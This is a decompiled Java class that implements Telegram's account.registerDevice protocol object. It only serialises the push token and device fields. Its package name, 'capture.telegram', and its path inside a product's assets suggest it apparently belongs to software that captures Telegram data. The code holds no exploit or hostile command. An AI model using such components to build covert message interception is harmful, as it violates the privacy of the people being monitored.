package com.vvt.capture.telegram.internal;

public class TLRPC$TL_account_registerDevice
  extends TLObject
{
  public static int constructor = 1147957548;
  public boolean app_sandbox;
  public String app_version;
  public String device_model;
  public String lang_code;
  public String system_version;
  public String token;
  public int token_type;
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.Bool.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    i = this.token_type;
    paramAbstractSerializedData.writeInt32(i);
    String str = this.token;
    paramAbstractSerializedData.writeString(str);
    str = this.device_model;
    paramAbstractSerializedData.writeString(str);
    str = this.system_version;
    paramAbstractSerializedData.writeString(str);
    str = this.app_version;
    paramAbstractSerializedData.writeString(str);
    boolean bool = this.app_sandbox;
    paramAbstractSerializedData.writeBool(bool);
    str = this.lang_code;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_account_registerDevice.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */